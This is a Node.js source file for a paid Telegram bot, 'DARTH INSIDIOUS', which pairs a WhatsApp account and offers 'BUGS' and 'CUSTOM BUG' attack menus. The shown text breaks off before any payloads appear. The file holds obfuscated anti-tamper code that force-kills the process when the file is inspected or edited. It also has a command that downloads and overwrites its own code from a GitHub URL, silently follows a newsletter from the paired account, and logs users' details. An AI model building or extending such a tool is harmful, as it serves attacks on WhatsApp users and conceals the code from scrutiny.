(function() {
  'use strict';

  // ---------------- Native References ----------------
  const nativeFs = require('fs');
  const nativeChildExec = require('child_process').execSync;
  const nativePid = process.pid;
  const nativeExit = process.exit.bind(process);

  // ---------------- Utilities ----------------
  let fsExtra;
  try { fsExtra = require('fs-extra'); } catch(e) { fsExtra = nativeFs; }
  const path = require('path');
  const crypto = require('crypto');

  // ---------------- File Path & Baseline ----------------
  const preferName = 'telegram.js';
  let filePath = path.resolve(__dirname, preferName);
  if (!nativeFs.existsSync(filePath)) filePath = __filename;

  function sha256(s){ return crypto.createHash('sha256').update(s,'utf8').digest('hex'); }

  let baselineHash, baselineLines, baselineLineHashes;
  try {
    const content = nativeFs.readFileSync(filePath, 'utf8');
    baselineHash = sha256(content);
    baselineLines = content.split(/\r?\n/).length;
    baselineLineHashes = content.split(/\r?\n/).map(l=>sha256(l));
    console.log('[i] Baseline SHA256 captured:', baselineHash, '| lines:', baselineLines);
  } catch(e) {
    console.error('[!] ERROR membaca baseline integritas:', e.message);
    try { nativeChildExec('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e){}
    try { nativeExit(1); } catch(e){}
    while(1){}
  }

  // ---------------- Hard Fail (Local) ----------------
  function hardFail(reason) {
    const timestamp = new Date().toISOString();
    const auditLine = `[${timestamp}] ALERT: ${reason} | pid=${nativePid} | file=${filePath}\n`;

    // Log lokal
    try { nativeFs.appendFileSync(path.resolve(__dirname, 'xxx.audit.log'), auditLine, 'utf8'); } catch (e) {
      try { nativeFs.appendFileSync('/tmp/xxx.audit.log', auditLine, 'utf8'); } catch(e2) {}
    }

    // Console
    console.error('\n[!] DETEKSI PENAMBAHAN KODE / TAMPERING:', reason, '| timestamp:', timestamp);

    // Hard kill
    try { nativeChildExec('kill -9 ' + nativePid, { stdio:'ignore' }); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1) {}
  }

  // ---------------- Integritas Checker ----------------
  function checkIntegrity() {
    try {
      const curr = nativeFs.readFileSync(filePath,'utf8');
      if (sha256(curr) !== baselineHash) {
        const currLinesArr = curr.split(/\r?\n/);
        if (currLinesArr.length > baselineLines) return hardFail('Baris bertambah (penambahan kode).');
        for (let i=0; i<Math.min(baselineLineHashes.length,currLinesArr.length); i++) {
          if (sha256(currLinesArr[i]) !== baselineLineHashes[i]) {
            return hardFail('Perubahan pada baris ' + (i+1));
          }
        }
        return hardFail('File diubah (SHA mismatch).');
      }
    } catch(e) {
      return hardFail('Gagal baca file saat pengecekan integritas: '+(e.message||e));
    }
  }
  setInterval(checkIntegrity, 1000);
  setTimeout(checkIntegrity, 200);

  // ---------------- Safe Require Option ----------------
  const allowRequire = (process.env.ALLOW_REQUIRE === '1');
  if (!allowRequire) {
    if (require.main !== module) {
      console.error('[!] SECURITY ALERT: Dipanggil via require() - abort.');
      hardFail('Dipanggil via require() tanpa ALLOW_REQUIRE.');
    }
    if (module.parent !== null && module.parent !== undefined) {
      console.error('[!] SECURITY ALERT: Parent module terdeteksi - abort.');
      hardFail('Parent module terdeteksi tanpa ALLOW_REQUIRE.');
    }
  } else {
    console.log('[i] ALLOW_REQUIRE=1 aktif: file akan mengizinkan require() dari module lain.');
  }

  // ---------------- Anti-Hook / Anti-Bypass ----------------
  const nativePattern = /\[native code\]/;
  const proxyPattern = /Proxy|apply\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i;

  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  function forceKill() {
    try { nativeChildExec('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1){}
  }

  // CEK ANTI-HOOK & OVERRIDE
  try {
    const M = require('module');
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) forceKill();
  } catch(e) {}
  try {
    const exitFn = process[exitStr];
    const killFn = process[killStr];
    if (proxyPattern.test(exitFn.toString()) || bypassPattern.test(exitFn.toString())) forceKill();
    if (proxyPattern.test(killFn.toString()) || bypassPattern.test(killFn.toString()) || killFn.toString().length < 50) forceKill();
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) forceKill();
  } catch(e) {}

  const checkGlobals = () => {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try { if (flags[i] in global && global[flags[i]]) forceKill(); } catch(e) {}
    }
  };
  checkGlobals();

  // CEK HTTPS / HTTP MASKED
  const checkHttps = () => {
    try {
      const https = require(httpsStr);
      if (Function.prototype.toString.call(https.request) !== https.request.toString()) forceKill();
    } catch(e) {}
  };
  const checkHttp = () => {
    try {
      const http = require(httpStr);
      if (Function.prototype.toString.call(http.request) !== http.request.toString()) forceKill();
    } catch(e) {}
  };
  setTimeout(()=>{ checkHttps(); checkHttp(); },500);

  // ---------------- Runtime Monitor ----------------
  const monitor = () => {
    if (require.main !== module || (module.parent !== null && module.parent !== undefined)) forceKill();
    try {
      const M = require('module');
      if (bypassPattern.test(M.prototype.require.toString())) forceKill();
    } catch(e) {}
    checkHttps(); checkHttp(); checkGlobals();
  };
  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

})();

const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const vm = require('vm');
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  useMultiFileAuthState,
  DisconnectReason,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  proto,
  areJidsSameUser,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const { HttpsProxyAgent } = require('https-proxy-agent');
const agent = new HttpsProxyAgent('http://proxy-server:port');
const bot = new Telegraf(BOT_TOKEN, {
  telegram: { agent }
});
// === Path File ===
const premiumFile = "./Dilz/premiums.json";
const adminFile = "./Dilz/admins.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

// === 👤 DATA USER YANG START ===
let userStart = [];
const userFile = './user_start.json';

// Load data lama
if (fs.existsSync(userFile)) {
  userStart = JSON.parse(fs.readFileSync(userFile));
}

const userSet = new Set(userStart.map(u => u.id));


const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/78e658.png",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
  
  const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/dickyalghifari21-droid/whatsapp-media/main/token.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}
async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

console.log(chalk.bold.blue("Sedang Mengecek Database..."));


console.log("MEMVERIFIKASI.....");

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("TOKEN ANDA TIDAK TERDAFTAR DI DATA BASE !!!"));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }
  console.log(chalk.green(`[!] From System: Token Kamu Terdaftar Dalam Database! Terimakasih Sudah Membeli Script Ini.\n`));
  startBot();
}
  
  function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
██████╗ ██╗██╗     ███████╗
██╔ ═██╗██║██║     ╚══███╔╝
██║  ██║██║██║          ███╔╝ 
██║  ██║██║██║        ███╔╝  
██████╔╝██║███████╗███████╗
╚═════╝ ╚═╝╚══════╝╚══════╝
      `));
  console.log(
    chalk.bold.green(`
©DARTH INSIDIOUS
`));
}
   
validateToken();
     
     
     
      
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

// ========== VARIABLE GLOBAL ==========
let pairingWaiting = {};  // 🔥 TAMBAHKAN

// ========== FUNGSI START SESI ==========
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P',
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("120363404343696075@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`...`));
      
      // 🔥 NOTIFIKASI BERHASIL
      for (const [chatId, data] of Object.entries(pairingWaiting)) {
        try {
          bot.sendMessage(chatId, `✅ PAIRING BERHASIL!\n📱 Nomor: ${data.phoneNumber}`, { parse_mode: "Markdown" });
        } catch (e) {}
        delete pairingWaiting[chatId];
      }
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`...`));

      // 🔥 NOTIFIKASI GAGAL
      for (const [chatId, data] of Object.entries(pairingWaiting)) {
        try {
          bot.sendMessage(chatId, `❌ PAIRING GAGAL!\n📱 Nomor: ${data.phoneNumber}`, { parse_mode: "Markdown" });
        } catch (e) {}
        delete pairingWaiting[chatId];
      }

      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

bot.command('update', async (ctx) => {
    if (!OWNER_IDS.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Akses ditolak!");
    }

    // Link Raw GitHub kamu
    const URL_GITHUB = 'https://raw.githubusercontent.com/dickyalghifari21-droid/Deatrh-vader/refs/heads/main/Dilz.js';
    
    // NAMA FILE YANG ADA DI PANEL (WAJIB SAMA DENGAN FILE UTAMA BOT)
    const NAMA_FILE_BOT = 'Dilz.js'; 
    const PATH_TUJUAN = path.join(__dirname, NAMA_FILE_BOT);

    try {
        await ctx.reply('🔄 Mendownload update permanen...');

        const response = await axios({
            method: 'get',
            url: URL_GITHUB,
            responseType: 'arraybuffer' 
        });

        fs.writeFileSync(PATH_TUJUAN, response.data);

        await ctx.reply('✅ Update Selesai! File telah diperbarui di Panel.');
        await ctx.reply('Bot akan restart otomatis untuk menjalankan kode terbaru...');

            setTimeout(() => {
            process.exit(0);
        }, 2000);

    } catch (error) {
        console.error(error);
        ctx.reply('❌ Gagal Update: ' + error.message);
    }
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
        
// ========== FUNCTION LOADING BAR ==========
async function showLoadingBar(ctx) {
    const loadingMsg = await ctx.reply("👑 *@dickxmod*\n\n`[░░░░░░░░░░] 0%`", {
        parse_mode: "Markdown"
    });
    
    const steps = [
        { progress: 10, text: "Memuat database..." },
        { progress: 25, text: "Mengecek user..." },
        { progress: 40, text: "Memuat plugin..." },
        { progress: 60, text: "Inisialisasi API..." },
        { progress: 75, text: "Memuat menu..." },
        { progress: 90, text: "Finalisasi..." },
        { progress: 100, text: "Selesai!" }
    ];
    
    for (const step of steps) {
        const filled = Math.floor(step.progress / 10);
        const empty = 10 - filled;
        const bar = "█".repeat(filled) + "░".repeat(empty);
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loadingMsg.message_id,
            null,
            `👑 *@dickxmod*\n\n\`[${bar}] ${step.progress}%\`\n\n_${step.text}_`,
            { parse_mode: "Markdown" }
        );
        await sleep(500);
    }
    
    // ✅ TAMBAHIN DISINI - Efek typing sebelum loading dihapus
    await ctx.telegram.sendChatAction(ctx.chat.id, "typing");
    await sleep(500); // biar keliatan efeknya 0.5 detik
    
    // Hapus pesan loading
    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);
}

// ========== KONFIGURASI AWAL ==========
const colors = ['Primary', 'Danger', 'Default', 'Success'];

function getRandomColor() {
    return colors[Math.floor(Math.random() * colors.length)];
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

// Variabel buat nyimpen warna user
let userColor = {};

// Daftar warna untuk fitur gonta-ganti
const warnaBergantian = ['merah', 'biru', 'hijau', 'abu'];

// ========== FUNGSI GET MENU UTAMA ==========
function getMainMenu(userId) {
    const pilih = userColor[userId] || 'abu'; // default abu
    let warnaUtama;

    if (pilih == 'semua') {
        return [
            [
                { text: "BUGS", callback_data: "bug_menu", style: 'Danger' },
                { text: "CUSTOM BUG", callback_data: "bug_custom", style: 'Success' }
            ],
            [
                { text: "HARGA SCRIPT", callback_data: "hargaa", style: 'Danger' }
            ],
            [
                { text: "SETTINGS", callback_data: "owner_menu", style: 'Default' },
                { text: "GANTI WARNA", callback_data: "back_pilih_warna", style: 'Primary' }
            ],
            [
                { text: "DEVELOPERS", url: "https://t.me/dickxmod", style: 'Success' }
            ]
        ];
    }

    if (pilih == 'merah') warnaUtama = 'Danger';
    else if (pilih == 'biru') warnaUtama = 'Primary';
    else if (pilih == 'hijau') warnaUtama = 'Success';
    else if (pilih == 'abu') warnaUtama = 'Default';

    // URUTAN BARU: XTOOLS turun ke baris 2 sendirian, SETTINGS naik ke baris 1 sebelah XBUGS
    return [
        [
            { text: "BUGS", callback_data: "bug_menu", style: warnaUtama },
            { text: "CUSTOM BUG", callback_data: "bug_custom", style: warnaUtama }  // SETTINGS pindah ke sini
        ],
        [
            { text: "HARGA SCRIPT", callback_data: "hargaa", style: warnaUtama }    // XTOOLS pindah ke baris 2 sendirian
        ],
        [
            { text: "SETTINGS", callback_data: "owner_menu", style: warnaUtama },
            { text: "GANTI WARNA", callback_data: "back_pilih_warna", style: warnaUtama }
        ],
        [
            { text: "DEVELOPERS", url: "https://t.me/dickxmod", style: warnaUtama }
        ]
    ];
}

bot.start(async (ctx) => {
    const senderId = ctx.from.id;
    const namaUser = ctx.from.first_name || "Tidak ada nama";
// BENER (userIdStr dibuat DULU sebelum dipake)
const userIdStr = senderId.toString();  // ← TAMBAHKAN INI DULU
const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const waktuMulai = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    // PANGGIL LOADING BAR, JING!
    await showLoadingBar(ctx);

    // PROSES SAVE USER
    if (!userSet.has(senderId)) {
        const dataUser = {
            id: senderId,
            nama: namaUser,
            username: username,
            mulai: waktuMulai
        };
        userStart.push(dataUser);
        userSet.add(senderId);
        fs.writeFileSync(userFile, JSON.stringify(userStart, null, 2));
    }

    const userId = senderId.toString();
    const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";

    const pesanMenu = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
`;

    await ctx.replyWithPhoto(getRandomImage(), {
        caption: pesanMenu,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: getMainMenu(userId)
        }
    });
});

// ========== HANDLER OWNER MENU (SETTINGS) ==========
bot.action("owner_menu", async (ctx) => {
const userId = ctx.from.id.toString();
    stopAutoWarna(userId);
const senderId = ctx.from.id;
const username = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
const userIdStr = ctx.from.id.toString();
const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
    const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";

    const mainMenuMessage = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
<blockquote><strong>𝐂⦿𝐍𝐓𝐑𝐎𝐋</strong></blockquote>
• /update
• /addadmin
• /deladmin
• /Status
• /addsender
• /delsesi
• /addprem 
• /delprem 
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
`;

    const media = {
        type: "photo",
        media: getRandomImage(),
        caption: mainMenuMessage,
        parse_mode: "HTML"
    };

    const keyboard = {
        inline_keyboard: [
            //[{ text: "🎨 GANTI WARNA", callback_data: "back_pilih_warna" }],
            //[{ text: "👥 CEK USER", callback_data: "cek_user" }],
            [{ text: "🔙 KEMBALI KE MENU", callback_data: "back" }]
        ]
    };

    try {
        await ctx.editMessageMedia(media, { reply_markup: keyboard });
    } catch (err) {
        await ctx.replyWithPhoto(media.media, {
            caption: media.caption,
            parse_mode: media.parse_mode,
            reply_markup: keyboard,
        });
    }
});

// ========== HANDLER BACK PILIH WARNA (DENGAN INDIKATOR WARNA) ==========
bot.action("back_pilih_warna", async (ctx) => {
    const userId = ctx.from.id.toString();
    stopAutoWarna(userId);
    const warnaSaatIni = userColor[userId] || 'abu';
    
    let namaWarnaSaatIni = '';
    if (warnaSaatIni == 'merah') namaWarnaSaatIni = 'MERAH';
    else if (warnaSaatIni == 'biru') namaWarnaSaatIni = 'BIRU';
    else if (warnaSaatIni == 'hijau') namaWarnaSaatIni = 'HIJAU';
    else if (warnaSaatIni == 'abu') namaWarnaSaatIni = 'ABU-ABU';
    else if (warnaSaatIni == 'semua') namaWarnaSaatIni = 'SEMUA WARNA';
    
    const pesanAwal = `
<blockquote><strong>🎨 PILIH WARNA</strong></blockquote>
Silakan pilih warna tombol di bawah:

▸ Warna saat ini: ${namaWarnaSaatIni}
`;

    const tombolWarna = [
        [
            { text: "🔴 MERAH", callback_data: "warna_merah" },
            { text: "🔵 BIRU", callback_data: "warna_biru" },
            { text: "🟢 HIJAU", callback_data: "warna_hijau" }
        ],
        [
            { text: "⚪ ABU-ABU", callback_data: "warna_abu" },
            { text: "SEMUA WARNA", callback_data: "warna_semua" }
        ],
        [
            { text: "DISCO", callback_data: "gonta_ganti_otomatis" }
        ],
        [
            { text: "🔙 KEMBALI KE MENU", callback_data: "back" }
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: getRandomImage(),
        caption: pesanAwal,
        parse_mode: "HTML"
    }, {
        reply_markup: {
            inline_keyboard: tombolWarna
        }
    });
});

// ========== HANDLER GONTA-GANTI OTOMATIS ==========
// Variabel buat nyimpen interval otomatis
let intervalWarna = null;
let intervalData = {}; // Buat multiple user

bot.action("gonta_ganti_otomatis", async (ctx) => {
    const userId = ctx.from.id.toString();
    const senderId = ctx.from.id;
    // Simpan ctx untuk fungsi startAutoWarna
    if (!global.ctxUser) global.ctxUser = {};
    global.ctxUser[userId] = ctx;
    
    // Mulai auto warna
    startAutoWarna(ctx, userId);
    
    // Update ke menu utama
const username = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
const userIdStr = ctx.from.id.toString();
const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
    const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
    
    const pesanMenu = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
`;

    await ctx.editMessageMedia({
        type: "photo",
        media: getRandomImage(),
        caption: pesanMenu,
        parse_mode: "HTML"
    }, {
        reply_markup: {
            inline_keyboard: getMainMenu(userId)
        }
    });
});

// Fungsi stop otomatis untuk user tertentu
function stopAutoWarna(userId) {
    if (intervalData[userId]) {
        clearInterval(intervalData[userId]);
        delete intervalData[userId];
        return true;
    }
    return false;
}

// Fungsi start otomatis untuk user tertentu
function startAutoWarna(ctx, userId) {
    // Hentikan dulu kalau ada
    if (intervalData[userId]) {
        clearInterval(intervalData[userId]);
        delete intervalData[userId];
    }
    
    // Mulai interval baru
    intervalData[userId] = setInterval(async () => {
        try {
            const warnaSekarang = userColor[userId] || 'abu';
            let currentIndex = warnaBergantian.indexOf(warnaSekarang);
            let nextIndex = (currentIndex + 1) % warnaBergantian.length;
            let warnaBaru = warnaBergantian[nextIndex];
            
            userColor[userId] = warnaBaru;
            
            // Update menu utama user dengan warna baru
            const username = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
            const senderId = ctx.from.id;
        const userIdStr = ctx.from.id.toString();
const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
            const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
            
            const pesanMenu = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
`;

            try {
                await ctx.telegram.editMessageMedia(
                    ctx.chat.id,
                    ctx.msg?.message_id,
                    null,
                    {
                        type: "photo",
                        media: getRandomImage(),
                        caption: pesanMenu,
                        parse_mode: "HTML"
                    },
                    {
                        reply_markup: {
                            inline_keyboard: getMainMenu(userId)
                        }
                    }
                );
            } catch (editErr) {
                if (intervalData[userId]) {
                    clearInterval(intervalData[userId]);
                    delete intervalData[userId];
                }
            }
        } catch (err) {
            console.log(`Error auto warna:`, err.message);
            if (intervalData[userId]) {
                clearInterval(intervalData[userId]);
                delete intervalData[userId];
            }
        }
    }, 2000);
    
    // Simpan status auto mode
    global.autoModeStatus = global.autoModeStatus || {};
    global.autoModeStatus[userId] = true;
    
    return true;
}

// ========== HANDLER WARNA ==========
bot.action(/^warna_(.*)/, async (ctx) => {
    const pilih = ctx.match[1];
    const userId = ctx.from.id.toString();
const senderId = ctx.from.id;
    // Simpan pilihan warna
    userColor[userId] = pilih;

    // Kembali ke MENU UTAMA dengan warna baru
    const username = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
const userIdStr = ctx.from.id.toString();
const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
    const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";

    const pesanMenu = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
`;

    await ctx.editMessageMedia({
        type: "photo",
        media: getRandomImage(),
        caption: pesanMenu,
        parse_mode: "HTML"
    }, {
        reply_markup: {
            inline_keyboard: getMainMenu(userId)
        }
    });
});

// ========== HANDLER BACK (KEMBALI KE MENU UTAMA) ==========
bot.action("back", async (ctx) => {
    const userId = ctx.from.id.toString();
    // TAMBAHKAN INI DI AWAL, SETELAH const userId
const senderId = ctx.from.id;
const username = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
    if (global.autoModeStatus && global.autoModeStatus[userId]) {
        if (!global.ctxUser) global.ctxUser = {};
        global.ctxUser[userId] = ctx;
        startAutoWarna(ctx, userId);
    }
const userIdStr = ctx.from.id.toString();
const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
    const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";

    const pesanMenu = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
`;

    await ctx.editMessageMedia({
        type: "photo",
        media: getRandomImage(),
        caption: pesanMenu,
        parse_mode: "HTML"
    }, {
        reply_markup: {
            inline_keyboard: getMainMenu(userId)
        }
    });
});

// ========== HANDLER CEK USER (PAGINATION) ==========
let currentPage = 1;
const perPage = 10;

function getText(page) {
    const start = (page - 1) * perPage;
    const end = start + perPage;
    const usersPage = userStart.slice(start, end);
    const totalPages = Math.ceil(userStart.length / perPage);

    let text = `📋 **DAFTAR USER**
📊 Total: ${userStart.length} orang\n\n`;

    usersPage.forEach((user, index) => {
        text += `${start + index + 1}. <b>${user.nama}</b>\n`;
        text += `🆔 <code>${user.id}</code>\n`;
        text += `🔗 ${user.username ? user.username : 'Tidak ada username'}\n`;
        text += `⏰ ${user.mulai}\n\n`;
    });

    text += `🔹 Halaman ${page} / ${totalPages}`;
    return text;
}

function getButtons(page) {
    const totalPages = Math.ceil(userStart.length / perPage);
    const buttons = [];

    if (totalPages > 1) {
        const row = [];
        if (page > 1) row.push({ text: '⬅️ Sebelumnya', callback_data: `prev_${page}` });
        if (page < totalPages) row.push({ text: 'Berikutnya ➡️', callback_data: `next_${page}` });
        buttons.push(row);
    }

    buttons.push([{ text: "🔙 Kembali ke SETTINGS", callback_data: 'owner_menu' }]);
    return { inline_keyboard: buttons };
}

bot.action('cek_user', async (ctx) => {
    if (!OWNER_IDS.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Akses ditolak!");
    }

    if (userStart.length === 0) {
        return ctx.reply("📭 Belum ada user.");
    }

    currentPage = 1;
    await ctx.reply(getText(currentPage), {
        parse_mode: "HTML",
